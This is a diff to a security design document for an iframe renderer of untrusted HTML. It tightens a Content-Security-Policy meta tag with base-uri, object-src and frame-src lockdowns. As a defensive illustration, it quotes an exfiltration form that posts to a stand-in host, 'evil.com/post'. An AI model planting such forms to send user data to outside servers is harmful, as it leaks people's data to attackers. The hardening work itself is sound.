@@ -607,12 +607,15 @@ Sandbox to prevent CSRF and exfiltration.
 - **Strict CSP Meta Tag Injection:** Unlike `WebAppFrameUrl`, the renderer receives the raw HTML
   string. It must parse the HTML, strip any author-supplied CSP meta tags, and inject a strict CSP
   meta tag as the first child of the head:
-  `<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data:; connect-src 'none'; form-action 'none';">`.
+  `<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data:; connect-src 'none'; form-action 'none'; base-uri 'none'; object-src 'none'; frame-src 'none';">`.
 - **Form-Based Exfiltration Prevention (`form-action 'none'`):** When `allow-forms` is included in
   the iframe sandbox attributes (to allow local interactive form controls), untrusted scripts in
   `WebAppFrameSrcdoc` could attempt to submit an HTML form (`<form action="https://evil.com/post" method="POST">`)
   to an external server. Because `connect-src 'none'` only blocks APIs like `fetch` and `XMLHttpRequest`,
   injecting `form-action 'none';` closes HTML form navigation and submission bypasses.
+- **Base URI and Plugin Lockdown (`base-uri 'none'; object-src 'none'; frame-src 'none'`):** Prevents
+  untrusted markup from using `<base href="...">` tags to hijack relative URLs to external domains,
+  and restricts legacy plugin embeddings (`<object>`, `<embed>`) and nested subframes.
 - **Explicit Deny-All Permissions Policy:** To prevent untrusted markup from accessing sensitive hardware
   sensors (camera, microphone, geolocation) or interacting with the system clipboard without host mediation,
   the renderer must set an explicit deny-all Permissions Policy on the inner iframe element by default:
